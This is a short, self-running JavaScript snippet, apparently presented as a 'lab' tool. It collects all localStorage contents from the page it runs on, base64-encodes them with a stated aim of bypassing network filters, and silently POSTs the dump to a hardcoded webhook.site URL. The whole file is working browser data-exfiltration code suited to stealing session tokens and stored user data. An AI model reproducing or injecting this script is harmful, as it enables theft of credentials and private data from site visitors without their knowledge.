(function() {
    const WEBHOOK_URL = 'https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515';
    
    console.log("%c[Vanta Lab] Localhost Stealth Mode Active", "color: #00ff88; font-weight: bold;");

    const harvestAndEncode = async () => {
        const fullDump = {
            metadata: { host: window.location.hostname, ts: Date.now() },
            storage: {}
        };

        const keys = Object.keys(localStorage);
        for (const key of keys) {
            // This prevents the [Violation] 50ms lag
            await new Promise(r => setTimeout(r, 0));
            
            const val = localStorage.getItem(key);
            try {
                fullDump.storage[key] = JSON.parse(val);
            } catch {
                fullDump.storage[key] = val;
            }
        }

        const jsonString = JSON.stringify(fullDump);
        // Base64 encoding to bypass network filters
        return btoa(unescape(encodeURIComponent(jsonString))); 
    };

    const exfiltrate = async () => {
        const encodedData = await harvestAndEncode();
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: encodedData 
            });
            console.log("%c[+] Data Exfiltrated via Localhost", "color: #00ff00");
        } catch (e) {
            // Silent fail
        }
    };

    exfiltrate();
})();
